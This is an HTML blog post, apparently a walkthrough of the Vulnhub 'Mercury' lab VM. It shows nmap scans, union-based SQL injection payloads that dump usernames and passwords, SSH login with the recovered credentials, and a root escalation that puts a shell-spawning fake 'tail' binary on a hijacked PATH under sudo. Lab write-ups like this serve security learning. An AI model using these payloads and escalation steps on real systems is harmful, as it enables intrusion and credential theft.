@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Mercury
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Sept, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Mercury</a></li>
+        </ul>
+      </nav>
+<h3>Scanning:</h3>
+<pre><code><span>Nmap scan report ​ for​ 192.168.56.110
+Host is up (0.00013s latency).
+Not​ shown: 998 closed ports
+PORT STATE​ SERVICE
+22/tcp
+open ssh
+8080/tcp open http-proxy
+</span></code></pre>
+<h3>More Thorough Scan:</h3>
+<pre><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.56.110
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-25 11:48 EDT
+Nmap scan report for 192.168.56.110
+Host is up (0.000062s latency).
+Not shown: 65533 closed ports
+PORT STATE  SERVICE     VERSION
+22/tcp open ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux;
+protocol 2.0)
+8080/tcp open http-proxy WSGIServer/0.2 CPython/3.8.2
+| fingerprint-strings:
+[SNIP]
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: WSGIServer/0.2 CPython/3.8.2
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+crazyeights@es-base:~$
+</span></code></pre>
+<h3>Web:</h3>
+<ul>
+<li>
+<p>Using Insomnia:</p>
+<img src="images/mercury/m1.png" style="width: 80%;">
+</li>
+<li>
+Checking out /mercuryfacts/
+</li>
+<img src="images/mercury/m2.png" style="width: 80%;">
+<li>
+In the todo page, you can see there is a users table in the Database:
+</li>
+<img src="images/mercury/m3.png" style="width: 80%;">
+<li>
+<p>Checking out Mercury Facts, trying loading a fact:</p>
+<img src="images/mercury/m4.png" style="width: 80%;">
+</li>
+</ul>
+<h3>SQLI:</h3>
+<ul>
+<li>Trying to perform SQLi on this page, with an error gives you the sql
+error:</li>
+<img src="images/mercury/m5.png" style="width: 80%;">
+</ul>
+<h4>Properly performing SQLi:</h4>
+<img src="images/mercury/m6.png" style="width: 80%;">
+<h5>Getting the schema of the users table:</h5>
+<pre><code><span>1 union select column_name from information_schema.columns where
+table_name=​ 'users'
+</span></code></pre>
+<img src="images/mercury/m7.png" style="width: 80%;">
+<h5>Get usernames from users table:</h5>
+<pre><code><span>http://192.168.56.110:8080/mercuryfacts/1 union select username from users/
+</span></code></pre>
+<img src="images/mercury/m8.png" style="width: 80%;">
+<h5>Get passwords from users table:</h5>
+<pre><code><span>http://192.168.56.110:8080/mercuryfacts/1 union ​ select​ password from users/
+
+Fact ​ id:​ ​ 1 ​ ​ union​ ​ select​ ​ password​ ​ from​ ​ users​ . (('Mercury​ ​ does​ ​ not​ ​ have​ ​ any
+moons​ ​ or​ ​ rings​.',), ('​johnny1987​',), ('​lovemykids111​',),
+('​lovemybeer111​',), ('​mercuryisthesizeof0​.056​ Earths​',))
+</span></code></pre>
+<img src="images/mercury/m10.png" style="width: 80%;">
+<h3>SSH:</h3>
+<ul>
+<li>Trying the credentials found in the user table, the one for webmaster works
+<code>webmaster:mercuryisthesizeof0.056Earths</code></li>
+</ul>
+<h4>Logging in:</h4>
+<pre><code><span>crazyeights​@es-base:​~$ ssh webmaster​@192​.168.56​.110
+</span></code></pre>
+<h4>Getting user flag:</h4>
+<img src="images/mercury/m11.png" style="width: 60%;">
+<h3>Priv Esc:</h3>
+<ul>
+<li>Finding another user:</li>
+<img src="images/mercury/m12.png" style="width: 60%;">
+<li>Decode from base64:</li>
+<img src="images/mercury/m13.png" style="width: 60%;">
+</ul>
+<p>User credentials:
+<code>linuxmaster:​ mercurymeandiameteris4880km</code></p>
+<h3>Find commands user can run as root:</h3>
+<img src="images/mercury/m14.png" style="width: 60%;">
+<p>Checking out syslog:</p>
+<img src="images/mercury/m15.png" style="width: 80%;">
+<pre><code><span>linuxmaster@mercury:/home/webmaster/mercury_proj$ cat /usr/bin/check_syslog.sh
+#!/bin/bash
+tail -n 10 /var/​ log​ /syslog
+</span></code></pre>
+<ul>
+<li>Since user can keep their environment vars when running check_syslog as root, create a new tail bin, to run instead of the intended tail, and add its path before the intended tail.</li>
+</ul>
+<h4>Creating a tail bin to get a root shell:</h4>
+<pre><code><span>linuxmaster@mercury:~$ cat tail.c
+#include &lt;unistd.h&gt;
+void​ main​(int​ argc, char​ *argv[]){
+    setuid(​0);
+    setgid(​0);
+    system(​&quot;/bin/sh -i&quot;​);
+}
+</span></code></pre>
+<img src="images/mercury/m16.png" style="width: 80%;">
+<img src="images/mercury/m18.png" style="width: 80%;">
+<h4>Update PATH:</h4>
+<pre><code><span>export ​ PATH=/tmp:$PATH
+</span></code></pre>
+<img src="images/mercury/m17.png" style="width: 60%;">
+<p>Run the script:</p>
+<pre><code><span>sudo --preserve-env-PATH /usr/bin/check_syslog.sh
+</span></code></pre>
+<p>Get root flag:</p>
+<img src="images/mercury/m20.png" style="width: 80%;">
+<p>FIN.</p>
+<br>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
